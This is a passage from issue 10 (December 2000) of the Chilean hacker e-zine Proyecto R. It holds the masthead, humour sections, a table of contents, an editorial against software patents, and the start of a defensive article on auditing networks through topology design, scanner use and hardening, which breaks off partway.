
	<< PROYECTO_R >> EL PRIMER MAGAZINE ELECTRONICO CHILENO    
 ____                                      __                   ____       
/\  _`\                                   /\ \__               /\  _`\     
\ \ \L\ \_ __   ___   __  __     __    ___\ \ ,_\   ___        \ \ \L\ \   
 \ \ ,__/\`'__\/ __`\/\ \/\ \  /'__`\ /'___\ \ \/  / __`\       \ \ ,  /   
  \ \ \/\ \ \//\ \L\ \ \ \_\ \/\  __//\ \__/\ \ \_/\ \L\ \       \ \ \\ \  
   \ \_\ \ \_\\ \____/\/`____ \ \____\ \____\\ \__\ \____/        \ \_\ \_\
    \/_/  \/_/ \/___/  `/___/> \/____/\/____/ \/__/\/___/   _______\/_/\/ /
                          /\___/                           /\______\       
                          \/__/                            \/______/      
                          
						LA COPIA INFELIZ DEL EDEN 
    MAIL: proyecto_r@bigfoot.com
    URL:  www.cdlr.org                          
                          
    	    <--------: Numero 10 - Diciembre del 2000 :-------->


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-


                          ..--::  DISCLAIMER  ::--..

      Toda la informacion aqui contenida se publica unicamente con fines
  educativos, el mal uso de la misma no sera en ningun caso responsabilidad
   del editor ni de alguno de los miembros del staff, en algunos casos esa
    misma informacion es solo un modo de diversion, ya que lo que aqui se
                     expone puede ser totalmente falso 

    Aunque poner en practica algunas de las cosas aqui publicada puede ser
      ilegal, en ningun momento pretendemos inducir a la ilegalidad con
                                lo aqui expuesto.

     Los acentos y caracteres especiales han sido eliminados para evitar
              problemas de compatibilidad con algunos sistemas

                         Editor Recomendado Edit del DOS
                         En otros no se ve del todo bien

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

    ..--::   Staff Oficial  ::--..

    PlaXiuS                          Taker       
    AndyK                            ArcangneT   
    Mate Swichman                    Don Cucumber 
    ToNiK                            Mr.Nexus
    TeeSPy                           CHacK    
    Death_Bot                        Billy
    PerseoNet                        PunkyX

	Ehhh,... quien da mas ?


    ..--::  Lamer del Mes  ::--..

   <MoonSpell> hola manga de lamos 
   [...]
   <MoonSpell> yo te toy webeando a tu 
   <MoonSpell> y burlandome de ti por ke se mas ke voz
   [...]
   <MoonSpell> y por ke escribo para 2 de las mejores zines de latinoamerica
   [ Nex: Desde luego, no volvera a ser para la R... ]
   <MoonSpell> ke sin tener niuna wea tengo el puesto de cualquier wea k 
               estudio 6 años 
   <MoonSpell> y no voy a estudiar nunca 
   <MoonSpell> pq es una perdida de tiempo
   [ Nex: xDDDDD, que mas se puede decir .... ]


    ..--::  Sux del Mes  ::--..

  Siemems, por no escuchar desde abril los mensajes que dejan en el numero
  900 de su servicio  tecnico esas amas de casa  preocupadas porque se les
  quemo la tostadora. 


    ..--::  Soporte 911  ::--..
    
    Usuario: Oiga, soporte..???
    Soporte: Si se~or, en que le puedo ayudar..???

    Usuario: Vera Vd. es que no me funciona mi mail..
    Soporte: Hmmm, escribe bien su direccion de mail ?

    Usuario: Creo que si, ... bueno, arroba es con 'b' o con 'v' ???
    
    Plop..!!!    
    
  
    ..--::  Saludos  ::--..

    SET                 http://www.set-ezine.org
    RaregaZz            http://raregazz.acapulco.uagro.mx
    JJF/Hackers Team    http://www.jjf.org
    InET                http://www.warpedreality.com/inet
    HVen                http://www.hven.com.ve
    Networking Center	http://www.networking-center.org
    Zine Store          http://surf.to/zs
    NetSearch E-Zine    http://www.netsearch-ezine.com
    
    Y a todos los compa~eros que se nos olvidan...

   Ante las numerosas quejas recibidas despues del zine anterior alegando
   que el editor no estaba borracho durante su trabajo como en anteriores
   numeros, en estos momentos una botella de Moskovskaia adorna mi mesa.

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

                          ..--:: Contenidos ::--..

 01. Introduccion .................................  Editor
 02. Editorial -Patentes de Software- .............  Editor
 03. Auditando Sistemas ...........................  TeeSPy & Don Cucumber
 04. Seguridad en Redes ...........................  Tomas Barros
 05. Creando fuentes ..............................  Shisei Brujo
 06. Descubriendo Linux Red Hat 5.0 (parte II) ....  Mr.Nuk3m
 07. AS/400, Seguridad Nivel 50 y algo mas... .....  Taker
 08. 3 1/2 (O mini-articulos, :)) .................  Varios
  08.1/3       - Auditoria HP/UX ..................  Don Cucumber
  08.2/3       - Easter Eggs ......................  CHack
  08.3/3       - Cronica del hmBCN '2000 ..........  TnK
 09. Noticias CDLR ................................  Editor
 10. Noticias del Mundo del Espectaculo ...........  Mate & TnK & Nexus
 11. Bugs .........................................  TeeSPy & Nexus & CHack
 12. Ha llegado Mail ..............................  Nexus & Taker
 13. Chistes, Cuentos y otras burradas ............  Varios
 14. Llaves PGP....................................  CDLR
 15. EOF ..........................................  Editor

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-


                     ..--:: 01. Introduccion  ::--..
                               by Mr.Nexus

  Y van 10 ediciones ya, mas de dos a~os de  CDLR dando la murga  por ahi. Es
normal que  los editores se  vayan gastando, jeje, ... si, has leido bien, en
este  numero hay  un cambio importante,  yo! Durante la  realizacion  de este
numero el  Sr. Taker ha  escogido las mujeres,  los estudios, las mujeres, el
trabajo,  las mujeres, ... y  demas trivialidades  del mundo fisico en vez de
dedicar su tiempo  a los lectores de  la R, por lo que el puesto de editor ha
recaido sobre mi persona, el Nexus, a ver si lo hago bien...

  Al tema, al tema, ... las colaboraciones para este numero han sido escasas.
Tal vez la gente no se haya enterado de que hemos vuelto a estar online o tal
vez  fue porque  durante la edicion  del anterior numero,  el editor  tenia 0
gramos de alcohol en sangre y a la gente no le gusto su fino humor. 

  En este  numero  tenemos articulos  de criptografia,  como  auditar  redes,
seguimos con  el curso de RedHat, el articulo de rigor de AS/400 por parte de
taker (casi es una tradicion xD), Easter Eggs, Sql, bugs, ...  tambien hay
una peque~a cronica del Hackmeeting que se realizo  hace poco en Espa~a ... y
muchas cosas mas que esperamos que os gusten. 

  Press any key to continue...

   
:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-


           ..--:: 02. Editorial - Patentes de Software ::--..
                              by Mr.Nexus

  El  cambio  de editor  no solo supone  un cambio en  el handle  de la linea
'Editor de este numero: Fu1An0', ... tambien hay cambios significativos en el
zine. Y empezando por la creacion de una editorial de verdad!

  Es comun en los zines poner la tipica editorial con las mismas chorradas de
siempre,  que si  bienvenidos, que  si en este  numero  tenemos  tal  y  cual 
articulo, y  demas cosas, ... Pero eso no son editoriales propiamente dichas,
eso son  introducciones,  y por esa misma razon, hemos decidido hacer en la R
10 una editorial  de verdad :)  Una editorial  en la que se debata algun tema
de actualidad  que tenga  relacion con  la seguridad en las redes,  o con  la
informatica en general.

  ¿ Y que tema ha atraido nuestra  atencion durante los  ultimos meses ?, sin
duda las  patentes del  software. Se ha  hablado largo  y tendido  sobre este
delicado tema,  y se han escrito miles de lineas a costa de flames contra los
estados, compa~ias,  grandes hermanos  y demas ... En CDLR queremos colaborar
con esta campa~a, asi que aca va nuestro modesto aporte.

  Las patentes  de  software  constituyen el  peligro mas  inminente  para el
desarrollo de la informatica  actual. Tal vez el ejemplo mas claro y que esta
mas de moda en este momento sea el del algoritmo RSA. Hasta ahora nadie podia
usar la formula 'c = me mod n' en sus programas sin tener que  pagar por ello
a la RSA. Estos hicieron un movimiento bastante curioso que  algunos tacharon
de inteligente, 15 dias antes de que expirara esta patente decidieron liberar
la conocida formula y asi 'donarla' al mundo para que cualquier desarrollador
la use en sus programas. Muchas gracias  RSA, a cambio te doy lineas y lineas
de publicidad gratis.

   http://www.rsasecurity.com/news/pr/000906-1.html

  Es logico que  los programadores, dise~adores,  analistas  y demas,  deseen
proteger  sus ideas  del plagio  y la copia,  pero desde  luego esta no es la
manera.  Compa~ias que  hace 15  a~os se  enriquecieron gracias a la falta de
patentes  de soft,  ahora se  embarcan en  la cruzada  de patentar como suyas
ideas  tan  simples  como  hacer  un   "Sistema  dinamico  de  preguntas  mas
frecuentes"  ( escribir una FAQ ... ), uno ya  se rie por no llorar, ... ¿ es
posible patentar una idea?, ¿y una linea de codigo?

  Ante el  peligro real  de las patentes  de software, se han iniciado varios
movimientos de recogida  de firmas en contra de este claro abuso por parte de
los gobiernos.  El movimiento  mas conocido es  el iniciado por los chicos de
EuroLinux, en el que a traves de su pagina web recogen apoyos en contra de lo
que parece inminente por parte de los de arriba.

   http://petition.eurolinux.org/index_html?LANG=es

  Aparte del  claro detrimento  que las patentes  de software  provocan en el
desarrollo  de  nuevas  empresas,   productos  novedosos  y   desarrolladores
brillantes, tambien constituyen un peligro hacia el soft libre. Probablemente
sea el  mayor peligro que en  la actualidad acecha a  nuestro querido linux y
demas.  Un software  no es libre  desde el momento en que sus desarrolladores
deben de pagar  por usar 'algo'  en su desarrollo. ¿ Que pasara cuando exista
una caracteristica novedosa  que  ansien  todos  los  usuarios, pero que solo
pueda  ser  desarrollada  usando  un  algoritmo  ya  patentado ?, ese sera el
comienzo del fin del soft libre ... y ya ha empezado.

  Cada  uno  de  nosotros como  amantes de  la libertad  que  somos,  debemos
preocuparnos  mucho  por  este  tema tan delicado  y actuar  en consecuencia.
Debemos movilizarnos  en contra de esta y otras ideas estupidas  de los jefes
de arriba, ¿que mas nos queda?

  Cierro con unas palabras del  admirado John Carmack, el master del Quake, y
otros  juegos  3D:  "Me horroriza la idea  de que se  me pueda  presentar  un
problema, me ponga a resolverlo logicamente con las herramientas adecuadas, y
acabe teniendo  un programa  que no puede ser usado legalmente porque alguien
siguio los mismos pasos hace a~os y registro una patente sobre ello."

  Informacion:

   http://www.juantomas.com/letter_ex1_es.html
   http://www.freepatents.org/
   http://www.barrapunto.com/articles/100/09/15/0835254.shtml (y otros...)
   http://lpf.ai.mit.edu/

http://petition.eurolinux.org/index_html?LANG=es <- ¿A que esperas? firma ya!

  Como noticia  de  casi ultima  hora,  en estos momentos la Comision Europea 
esta debatiendo el tema de las patentes del software. Cualquiera puede enviar
un mail a la direccion consultation@eurolinux.org para que sea  transmitido a 
los  representantes de  cada pais  de la UE,  tratando de evitar la inminente 
catastrofe que se nos viene encima.

  Las reglas de redaccion  de estos mails se pueden encontrar junto con mucha 
mas informacion en: http://petition.eurolinux.org/consultation

  No seas pasivo con este tema, .... tu futuro depende de ello.


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
                      

                     ..--:: 03. Auditando Sistemas ::--..
                                      by 
                           teespy <teespy@bigfoot.com>
                                      &
                       Don Cucumber <cucumber@webhost.cl>

----[[ Intro ]] 

Ultimamente me he dado cuenta de que en bastantes listas de correo en las que
estoy subscrito gente pregunta ke factores se deben tomar en cuenta a la hora
de hacer  una auditoria.  La gente  responde con  "revisa las  checklists  de
www.xyz.org,  pero eso es  solo el comienzo,  luego haz lo demas". Lo malo es
que en ninguna parte he visto como se hace lo demas.

El articulo,  como lo dice  el titulo (o como en el futuro lo dira por que al
momento de  escribir esto aun  no le pongo  titulo), trata de como, *segun mi
punto de vista*, se deberia hacer una auditoria.

No soy ningun  experto en seguridad.  De hecho, estoy lejos de serlo, pero si
tengo bastante experiencia  con redes y seguridad. Lo suficiente a mi parecer
para escribir sobre esto sin cometer grandes equivocaciones.

He visto en la web  guidelines de  como hacer  auditorias,  reglas a  seguir,
cuantificaciones,  graficos,  etc.  Al parecer  toda el  area  de como  hacer
auditorias ya esta reglamentada.

Supongo  entonces ke  sera conveniente  decir que NO he leido ninguno de esos
documentos,  y de  hecho tampoco  pienso ni  me interesa  hacerlo.  Trate  de
encontrar documentos  que si explicaran  tecnicas, tips, sugerencias, etc. No
encontre mucho sobre esto.

Entonces,  lo que  salga de  este articulo no es para nada ni pretende ser la
"guia final de las auditorias",  pero si pretende al menos aportar un poco al
tema. Vamos, ke de cualkier cosa ke tenga letras se puede sacar algo.

Una  auditoria  consiste  en  una  investigacion  de  una red, por lo cual el
objetivo  principal es  reunir la  mayor informacion  posible de  esa red,  y
entonces analizarla y sacar resultados, para luego poder asegurar la red.

En  el  documento tratare  de  explicar  la  manera  de  analizar  y de sacar
conclusiones sobre cada aspecto a tomar en cuenta. De decir por que esta bien
hacerlo  de esta manera  o mal de esta otra, que implicaciones tiene la una o
la otra, etc.

Lo dicho. Vamos a empezar.

    Nota: Cuando hablo de "maquina", me refiero a un computador, computadora,
          box, tarro, PC o como se kiera llamar.

----[[ Topologia de la red ]]

La  primera  cosa  a tomar en cuenta  a la  hora  de auditar  una red,  es su
topologia.  i.e.  Donde  colocar  el  firewall, donde  poner  el/los  Bastion
Host(s),  donde deberia  ir el IDS, y cual es la configuracion de red interna
mas adecuada para cada caso, etc.

En este capitulo entonces, analizaremos 2 cosas: 
                       - La topologia del lugar de nuestra red en la 
                         que se produce el "choke" con internet.
                       - La topologia interna de la red.

Partiremos con la red de choke (notese que este no es el nombre verdadero que
se le da a  esa red ni nada por el  estilo, o al  menos no he escuchado nunca
que la llamen de esa manera. Es solo la forma en que yo lo llamo), para luego
pasar a la topologia de la red interna.

--[ Red de choke ]

(Basado en gran parte en [1])

En la mayoria de las redes,  siempre habran algunas maquinas que deben quedar
mas expuestas que las otras. Esto no se elige al azar. Hay maquinas que DEBEN
estar mas seguras que otras, ya que estan mucho mas expuestas a internet.

Consideremos, por ejemplo,  los 3 modelos mas  tipicos de topologias de redes
que conozco  (estos se aplican  a redes peque~as, pero con un poco  de logica
los podemos ampliar para aplicarlos a redes mas grandes).

Antes de ver los ASCII, algunas definiciones:
- Bastion Host:  El sistema que  esta en contacto  directo con internet y los
  posibles atacantes.  Normalmente  el primer blanco en cualkier atake, y por
  las mismas  razones, uno de  los servidores a  los que mas  hay que prestar
  atencion en lo que respecta a seguridad, mantencion, updates, etc.
  Normalmente es el caso de los servidores web, news, mail, etc.
- lin(x):  Representan las  lineas de  cableado que  unen a  2 makinas, o a 2
  redes, o a  una red y  una makina.  Notese ke  lin(x) no  es ningun  nombre
  estandar ni  nada asi. Es  solo el nombre que les puse para poder referirme
  a ellas mas facilmente.
- NAT:  "En su mas  simple configuracion,  NAT  (Network Adress Translator, o
  Traductor  de direcciones de  red), opera  como router  conectando 2 redes;
  Una de esas redes,  designada  como "inside"  (interior),  tiene  asignadas
  direcciones  privadas  u   obsoletas  ke   necesitan   ser  convertidas  en
  direcciones  legales antes  de que los  paquetes sean  redirigidos hacia la
  otra red, designada como "outside" (externa, normalmente internet)." [2]
  Existen  muchas  implementaciones  de  NAT,   algunas  como  software  para
  diferentes SO, y otras implementadas en los mismos routers.
  La implementacion de NAT en linux 2.2.x se conoce como IP-masquerade.
  Se puede encontrar mas info de NAT en [3].
- Router:  Obviamente,  el encargado de  comunicar las  redes.  Puede  ser un
  router  tradicional,  o  un  sistema  actuando  como  router  mediante  NAT
  ( ip-masquerade ),  routing  protocols,  etc.   Se  analizara  que  es  mas
  conveniente usar en cada caso.
- Firewall:  Nuestro  sistema  de  filtrado  de  paquetes. Puede ser desde un
  simple linux  con ipchains  filtrando  paquetes,  hasta un sistema firewall
  avanzado como  CheckPoint FW-1,  o tambien un  linux ke esconda nuestra red
  interna mediante NAT (en este caso, tendremos un router/firewall).

Ahora, los ejemplos...

Ejemplo #1-

  |-----------------|   lin0   |------|   lin1   |--------|
  | red interna,    |----------|router|----------|Internet|
  | bastion host(s) |----------|normal|----------|        |
  |-----------------|          |------|          |--------|

(Con router normal me refiero a ke el router no es un sistema con NAT)

Esta, es una configuracion MUY poco deseable.

Primero que nada,  el/los  bastion  host(s) estan  ubicados dentro de  la red
interna, lo cual es, repito, MUY poco conveniente. Ahora digo por que.

El firewall en esta red, debe ir en la interfaz de red lin0,  lo mismo con el
IDS. Esto  trae en si  varios problemas: La configuracion de nuestro firewall
se volvera  tediosa y en  muchos casos  insegura  y propensa  a  errores,  al
tener ke  dejarlo mas  o menos abierto,  para  que  asi  nuestros  bastion(s)
host(s) pueda(n) servir a su(s) proposito(s) (servidor web, news, mail, etc.)

Por otra  parte,  si es que un intruso logra entrar al sistema (normalmente a
travez de alguno  de los bastion hosts),  este tendra  facil acceso a todo el
resto de la red (podra snnifear conecciones, al estar en el mismo segmento de
red que otras  maquinas, no tendra restricciones como firewalls en su camino,
etc.).

Y como ultima cosa,  aunque hemos dicho  que el bastion host es el server que
esta en  contacto directo  con internet,  en este caso,  tendremos  que todas
nuestras  maquinas  seran  de  una  u  otra  manera  bastion  hosts,  lo  que
obviamente, no es para nada conveniente.

Ejemplo #2-

|-----------------|   lin0   |------------|   lin1   |--------|
|  red interna    |----------|bastion host|----------|Internet|
|                 |----------| NAT router |----------|        |
|-----------------|          |------------|          |--------|

Esta es una tipica  configuracion de una "home office" o de alguna red de una
empresa peque~a.

Aqui, primero tenemos un  servidor corriendo algun software NAT (mas conocido
como ip-masquerade en  el mundo linux  2.2). En esa misma makina, es donde se
encuentra  nuestro bastion host, y ademas, nuestro firewall, ke en  este caso
sera el mismo software NAT,  que esconde  las makinas  ke estan detras de el,
las cuales no son accesibles directamente mediante internet.

La configuracion es bastante buena en muchos casos,  ya que  la unica maquina
con la que  tenemos que  ser paranoicos,  es el  bastion host. (por supuesto,
esto no  quiere decir  que tenemos  que descuidar  las demas. Siempre esta la
posibilidad de que alguien  accese al  bastion host, y desde alli gane acceso
a la  red interna,  o que  el atacante  sea un  usuario  interno, aunque esta
posibilidad es  poco comun,  ya  que  normalmente  estas redes  son peque~as,
muchas veces de un solo usuario ke usa varias makinas).

Por ultimo decir que,  si nuestra red empieza a crecer, y ya necesitamos algo
mas avanzado, como tener  makinas separadas para  los distintos  servicios, o
varios  hosts diferentes  que den  cara a  internet,  esta  configuracion  se
kedara  chica para  nuestras necesidades,  y necesitaremos  cambiar a  una ke
acepte mas posibilidades, como la que se expone en el ejemplo #3.

Ejemplo #3-

|-----------| lin0 |------| lin1 |-------| lin2 |------| lin3 |--------|
|red interna|------|router|------|bastion|------|router|------|Internet|
|           |------|      |------|host(s)|------|      |------|        |
|-----------|      |------|      |-------|      |------|      |--------|

Esta, por ultimo, pasa a ser una configuracion para redes mas grandes.

En ella tenemos 2 routers:  El primero, entre  la interfaz lin3 y la lin2, es
normalmente llamado "access router",  y es  el  que nos da acceso a internet.
Por el pasa todo el trafico entrante y saliente de la red.

El otro  router (que se encuentra entre lin0 y lin1 en el ejemplo), es el que
separa el segmento en donde se encuentra(n) el/los bastion host(s) de nuestra
red interna. Este router realiza filtrado de paketes, para proteger a nuestra
red interna.

A la zona que se  encuentra entre los 2 routers, se le llama DMZ (acronimo de
DeMilitarized Zone).

Lo bueno de esta configuracion es que al estar nuestra red  interna y nuestra
DMZ en distintos segmentos de red, si un intruso entra a nuestra DMZ (la cual
sera normalmente el primer blanco de cualkier intruso), este no tendra acceso
facil a nuestra red interna, al no poder snnifear desde alli el trafico de la
red interna.

Por otra parte,  al tener todos  nuestros bastion hosts en la DMZ, no tenemos
que preocuparnos de dejar acceso  desde internet  a nuestra  red interna (los
hosts ke esten en esta  normalmente seran  Estaciones de trabajo,  makinas de
desarrollo,  etc.),  podremos tener  un firewall  con una  configuracion  muy
restrictiva (paranoica?),  sin que esto moleste mucho. Con esto, los datos de
la red interna tendran un nivel de seguridad bastante confiable.

Y bueno,  no vale  la pena decir  que en una  configuracion  como esta hay ke
tener especial  cuidado con  la DMZ. Si es  posible correr un IDS sobre ella,
tener  un  logserver que guarde todos los logs, un firewall hacia fuera, etc.
Todo lo ke se nos ocurra para asegurar este segmento :).


Cabe aclarar  ke todo lo expuesto  arriba son solo ejemplos de las topologias
de red mas comunes. 

Ahora, ke ke tiene ke ver esto a la hora de auditoria ?
La respuesta es un poco obvia:  Si por ejemplo nos toca hacer una auditoria a
una  red  peque~a, y esta red esta con  una configuracion  como la del tercer
ejemplo, le  diremos que  le conviene  cambiarse a  la del ejemplo #2, ya que
asi ahorrara recursos y la productividad sera la misma.

Y bueno, ya que las redes  pueden estar configuradas de muchas maneras, todas
ellas distintas, y que las necesidades de la  empresa / persona / universidad
 / etc. a la que  estamos  auditando  tambien son  muy cambiantes, nos tocara
aplicar un poco de logica y pensar en la solucion de topologia de red que mas
les conviene.


--[ Topologia interna de la red ]

El punto principal  a tomar en cuenta cuando decidamos como organizar nuestra
red internamente es  como debemos segmentarla.  La segmentacion es importante
debido a que cuando uno snnifea, snnifea un segmento de red. 

Entonces, si tenemos maquinas  con info delicada  en el mismo segmento de red
que una maquina de usuarios, es mas facil que un usuario gane  acceso root en
la  maquina  a  la  que  tiene acceso  y desde alli  acceda a la  informacion
importante que atravieza por nuestra red.

Al segmentar una  red debemos  tomar en  cuenta que este bien organizada, con
maquinas para un determinado proposito  preferentemente en el mismo  segmento
de red.  Tambien es  conveniente no tener segmentos de red demasiado grandes,
con el proposito de que si un atacante accesa uno de estos segmentos, tenga a
su disposicion la menor cantidad de maquinas posible.

Por otra parte, la  segmentacion ayuda a organizar bien las cosas, para en un
futuro poder manejar todo mas simplemente.

Lo otro es  ver que  tecnologia  usar  (ATM, Ethernet, FDDI, etc.),  pero  la
verdad es que de esto no se mucho, y no podria recomendar nada.  Lo unico que
se es  que depende mucho  de la cantidad  de recursos ($$) que  poseamos para
nuestra red y de que prestaciones necesitamos para ella.


----[[ Pruebas remotas ]]

Luego de haber analizado un poco la estructura de la red, y de haber dicho ke
es  conveniente hacer  este analisis la primera prioridad al auditar una red,
pasamos a otro punto ke es muy importante. Las pruebas remotas.

Con pruebas remotas me refiero  principalmente  a  descubrir  si  los daemons
(servicios) que esta corriendo nuestro bastion host  son vulnerables  a algun
tipo de atake remoto,  ya sea  debido a alguna  mala configuracion  o a algun
problema  de  programacion  (Buffer  Overflow,  Format  Bug,  etc.) del mismo
daemon|servicio.

En  este  punto  hay  que  hacer  el  analisis de varias maneras. Una que sea
automatica (scaners) y otra  en forma  manual. Que  por que en forma  manual?
Que por que  no puedes hacerlo todo click, click, click? Por que?  Algunas de
las razones de porque no, son:

- Nunca un scanner te va a dar TODAS las posibles fallas.
- El Scanner no piensa, por lo general no toma decisiones por si solo.
- Quizas  haya un firewall que  este bien  configurado y  al detectar  que lo
  estan scaneando,  te banee la IP y de como resultado (falso por cierto) una
  maquina que no tiene fallos, pero  tampoco tiene puertos abiertos, como por
  ejemplo el puerto 80 (WWW), sabiendo que scaneas el servidor Web!

Voy a explicar  un poco mas esto.. es claro que no hay un scanner que te diga
todas las fallas.  Hay herramientas  (me aburri  de escribir scanners, porque
las que  he usado  son mas que  un simple scanner).. ok, hay herramientas que
son  excelentes para  detectar fallas  de plataformas  Microsoft,  como es el
ejemplo  del  CIS, pero  no detecta  muchas  cosas  que  estan  presentes  en
plataformas  de la  familia Unix.  Como tambien,  por otro lado, en linux hay
herramientas excelentes,  como el Nessus (http://www.nessus.org), que detecta
muchas  cosas en las  plataformas Unix, pero no detecta bien los archivos con
errores tipicos  del IIS 4.0 de Microsoft, como las extensiones *.htw, *.htr,
etc.. Que se puede hacer?

Pues bien, usemos los  dos! Asi  se podra  llegar a  tener una idea mucho mas
global  del problema. Les recomendaria que siempre revisen las maquinas desde
distintas plataformas.. no les estoy diciendo que si es un Linux el servidor,
lo  revisen con  el Nessus y si es un Windows NT, lo revises con el CIS, sino
que en cualquier  caso, lo revises con los dos, por lo menos. Tambien esta el
Retina, ISS, etc.. pero esos son comerciales y MUY caros.

 [NdE: Aunque todos tienen su version de evaluacion disponible para bajar.]

Otra cosa  importante es que,  si sabes que  tienes un firewall  por delante,
probablemente este  banee tu ip y parezca que el servidor tiene TODO cerrado.
Lo que puedes hacer, si eres  obstinado y quieres  de todas  maneras  usar la
herramienta automagica, en el caso del Nessus y en cierto  modo en el CIS, es
restringir las  cosas a hacer.  Por ejemplo en el caso del Nessus,  que no es
mas que un  Front End  que llama  a muchos  scripts,  puedes  deshabilitar el
escaneo de puertos (eso es un flood del cual el firewall se defiende), etc...
y solo dejando activos los scripts que te van a ser de real ayuda.

Ahora  el otro  punto:  Por que  a mano  tambien?  Porque  muchas  veces  una
herramienta  de  auditoria  te  va a  dar  los llamados  'falsos  positivos',
entonces es recomendable usar una de estas herramientas y despues revisar los
errores detectados a mano (y si ves algo sospechoso, seguir revisando aun mas
alla  a mano).  Aca  les  va un  ejemplo  de una  gran  cantidad  de  'falsos
positivos':  Revisaba  un dia  una maquina, era un linux, yo sabia que estaba
mas o menos  segura, porque  no era  de  las distribuciones  POP  (RedHat por
ejemplo,  sino  que era  Debian,  que yo  no uso, pero se que es tosca.. y es
tosca porque le da prioridad a la seguridad por sobre la  comodidad), pero me
lleve  la sorpresa  del a~o,  cuando me  sale  como resultado del Nessus, que
tenia  mas de  45 HOYOS  de seguridad.. eso es casi.. no se,  es imposible, a
menos de que lo hayan hackeado y dejado 'de patas abiertas'.

Por  ejemplo me  salian errores como la pagina por defecto que deja el IIS de
microsoft, esa del ExAir o que estaba presente el 'showcode.asp' o el archivo
'get32.exe', etc..  siendo que era  un linux, que no corria ASP, que no tenia
*.exe, etc..  Esto me parecio  extremadamente  raro y  me puse a investigar a
mano y descubri  que no  importaba  que URL  pusiera, siempre me llevaba a la
misma pagina. En este caso era una pagina que me pedia login  y password para
la administracion  remota del  servidor.  Con eso le desconte alrededor de 42
hoyos, con lo que quedo con 3, lo que es normal.

Visto ya el por que es importante no solo confiar en las herramientas y hacer
el analisis remoto tambien a mano, pasamos a explicar un poco como.

Lo primero  y lo mas obvio,  es ver que  daemons (o  servicios, segun  sea el
caso), estan corriendo los hosts de la red que queremos escanear, y buscar en
internet  si  estos  son   vulnerables  a  algun  atake.  Buenas  fuentes  de
informacion  sobre  vulnerabilidades,  se  pueden  encontrar  en  [4],  y por
supuesto,  en  la  Home page  del  software  al  que   le  estamos   buscando
vulnerabilidades.

Ahora, que  no se halla  descubierto ninguna vulnerabilidad en el software, o
que  no halla ninguna  publica, no  kiere decir  que este sea seguro. Siempre
cabe la  posibilidad de  que en un futuro se descubra alguna, o de que alguna
ya  se  halla descubierto  por  algun  grupo  y que este  siendo mantenida en
secreto  por  este,  para  que  asi   solo  ellos  tengan  el  privilegio  de
aprovecharse de  ella.  Es por  esto  que siempre debemos estar atentos a los
upgrades  del software  ke usamos,  y a las  ultimas  noticias  sobre este, y
tampoco debemos confiar en ningun software. Por mas seguro ke creamos ke sea,
lo mejor  es  tratar  siempre  de hacerlo correr con los menores  privilegios
posibles,  y dar la menor  libertad posible  a los  usuarios sobre este. Otra
buena idea es correr siempre nuestras aplicaciones en un ambiente chrooted.

El  otro punto  importante  a tener en  cuenta a la hora de hacer el analisis
remoto, es probar la configuracion  de nuestro daemon|servicio. De nada sirve
tener la ultima version del ftp mas seguro ke exista si tenemos habilitado el
ftp  anonimo  con  accesso  de  lectura  a  /etc  ( obviamente  esto  es  una
exageracion,  dudo ke alguna  vez alguien se  encuentre un server configurado
asi :).

La verdad es que de esto no se puede hablar mucho en un paper como este. Cada
daemon es distinto, cada uno tiene su configuracion diferente, cada uno tiene
puntos susceptibles a errores a la hora de la configuracion, etc.

Lo  que si puedo  recomendar es que  si nos encontramos con el  daemon XXX en
cierto puerto,  averiguemos bien  su funcionamiento, leamos su documentacion,
etc. Hay ke tomar  en cuenta ke al ser esta una prueba remota, normalmente no
tendremos acceso a los archivos de configuracion del daemon|servicio,  por lo
tanto aki  juega un papel muy  importante nuestra imaginacion y creatividad a
la hora de preguntarnos  "ke es lo ke podria estar mal" o "ke pasaria si hago
tal cosa".

Puede  que   parezca  ridiculo  probar  la   configuracion  de   los  daemons
remotamente,  siendo que despues  tendremos acceso  a la maquina para revisar 
los  mismos  archivos  de  configuracion  (si,  esto  es  una  auditoria,  se 
acuerdan?), pero no es asi. Aun revisando  los archivos de  configuracion, se 
nos   pueden  escapar   muchas  cosas   que  remotamente   serian  facilmente 
detectables.  Un muy buen ejemplo de como un servidor puede ser vulnerado por
medio  del  aprovechamiento  de  malas  configuraciones puede  ser encontrado 
en [5].


----[[ Pruebas Locales ]]

Ahora llegamos a lo  que para  mi es  el  punto critico a la hora de asegurar 
algo. La configuracion local.

Todo lo  expuesto aqui es  hablado como  si estuvieramos auditando un server,
pero recordemos que  en realidad nos estamos enfrentando con una red,  por lo
tanto hay que analizar cada host singularmente.

Lo primero  que  recomiendo hacer  es ver  que cosas son las que realmente se
necesitan. A mayor cantidad de programas innecesarios corriendo, mayor riesgo
de que alguno de ellos sea un punto de entrada para un atacante.

Si el sistema ke  estamos  auditando  cumple un  rol  demasiado importante en
nuestra red (por ejemplo un bastion host),  seria conveniente  tenerlo lo mas
"capado" posible.

